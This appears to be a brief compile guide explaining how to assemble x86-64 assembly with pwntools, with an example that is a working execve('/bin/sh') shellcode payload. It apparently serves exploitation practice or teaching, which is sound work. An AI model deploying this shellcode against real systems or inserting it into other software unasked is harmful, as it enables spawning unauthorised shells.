# Compile guide
You may first obtain pwntools here: https://github.com/Gallopsled/pwntools

These assembly code can be directly assembled in pwntools as shown in the example below:
```
from pwn import *

context.arch = "amd64"

shellcode =  """mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
assembled_shellcode = asm(shellcode)
```